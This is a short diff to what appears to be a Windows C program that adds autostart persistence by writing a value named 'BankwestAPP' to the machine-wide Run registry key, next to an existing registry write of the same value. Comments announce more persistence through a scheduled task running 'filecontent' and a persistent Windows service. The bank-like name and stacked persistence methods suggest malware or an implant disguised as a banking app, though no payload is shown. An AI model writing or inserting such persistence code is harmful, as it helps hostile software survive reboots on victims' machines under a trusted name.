@@ -52,6 +52,13 @@ int main()
 	RegSetValueExA(hkey, "BankwestAPP", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);	
 	RegCloseKey(hkey);
 
+	RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey); //open registry key handle.
+	RegSetValueExA(hkey, "BankwestAPP", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);	
+	RegCloseKey(hkey);
+
+
+	
+
 //Create a schtask - to run the filecontent.
 
 //Create a persistent windows service. 
